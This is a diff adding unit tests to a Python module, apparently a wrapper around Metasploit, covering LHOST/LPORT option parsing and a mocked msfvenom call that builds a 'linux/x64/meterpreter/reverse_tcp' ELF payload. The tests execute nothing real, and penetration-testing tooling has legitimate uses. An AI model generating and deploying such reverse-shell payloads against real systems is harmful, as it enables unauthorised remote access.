@@ -102,3 +102,33 @@ def test_read_session_timeout_breaks(monkeypatch):
     out = ryotenkai._read_session(session, timeout=0, interval=0, quiet_rounds=5)
     assert out == "chunk\n"
     assert session.read.call_count == 1
+
+
+def test_parse_options_equals_form():
+    assert ryotenkai.parse_options(["LHOST=10.0.0.1", "LPORT=4444"]) == {
+        "LHOST": "10.0.0.1",
+        "LPORT": "4444",
+    }
+
+
+def test_parse_options_space_form():
+    assert ryotenkai.parse_options(["LHOST 10.0.0.1"]) == {"LHOST": "10.0.0.1"}
+
+
+def test_generate_payload_success(monkeypatch):
+    calls = {}
+    monkeypatch.setattr(ryotenkai.subprocess, "run",
+                        lambda cmd, check: calls.setdefault("cmd", cmd))
+    result = ryotenkai.generate_payload("elf", "linux/x64/meterpreter/reverse_tcp",
+                                        "10.0.0.1", "4444", "out.elf")
+    assert result["status"] == "success"
+    assert "msfvenom" in calls["cmd"][0]
+    assert "out.elf" in calls["cmd"]
+
+
+def test_generate_payload_error(monkeypatch):
+    def boom(cmd, check):
+        raise ryotenkai.subprocess.CalledProcessError(1, cmd)
+    monkeypatch.setattr(ryotenkai.subprocess, "run", boom)
+    result = ryotenkai.generate_payload("elf", "p", "1", "2", "o")
+    assert result["status"] == "error"
